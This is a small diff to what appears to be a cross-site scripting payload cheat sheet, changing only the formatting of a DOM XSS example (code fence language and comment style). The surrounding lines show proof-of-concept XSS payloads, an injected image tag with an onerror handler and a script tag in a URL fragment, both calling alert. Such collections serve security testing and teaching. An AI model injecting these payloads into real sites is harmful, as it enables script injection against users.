@@ -196,9 +196,9 @@ DOM XSS
 #"><img src=/ onerror=alert(2)>
 ```
 
-```
-192.168.1.1:8080  # Normal
-192.168.1.1:8000/#<script>alert('XSS')</script>   # Abnormal
+```javascript
+192.168.1.1:8080                                  // Normal
+192.168.1.1:8000/#<script>alert('XSS')</script>   // Abnormal
 ```
 
 XSS in JS Context (payload without quote/double quote from [@brutelogic](https://twitter.com/brutelogic)
